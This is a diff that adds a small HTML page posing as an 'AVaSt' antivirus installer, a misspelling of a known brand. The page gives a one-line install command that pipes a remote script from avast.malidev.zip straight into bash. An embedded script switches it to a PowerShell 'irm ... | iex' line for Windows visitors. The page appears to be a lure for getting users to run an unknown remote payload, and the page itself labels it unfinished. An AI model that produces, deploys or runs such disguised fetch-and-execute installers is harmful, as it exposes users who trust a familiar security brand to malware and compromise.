@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>AVaSt install</title>
+</head>
+<body>
+<h1>AVaSt v0.0.1 installer</h1>
+<p>Install: <code id="cmd">curl -fsSL http://avast.malidev.zip/install.sh | bash</code> <font color="red"><b>NOT DONE YET!</b></font></p>
+<p>powered by GDPatch</p>
+<script>
+var p = (navigator.userAgentData && navigator.userAgentData.platform) || navigator.platform || "";
+var cmd = "curl -fsSL http://avast.malidev.zip/install.sh | bash";
+if (/Win/i.test(p)) cmd = "irm http://avast.malidev.zip/install.ps1 | iex";
+document.getElementById("cmd").textContent = cmd;
+</script>
+</body>
+</html>
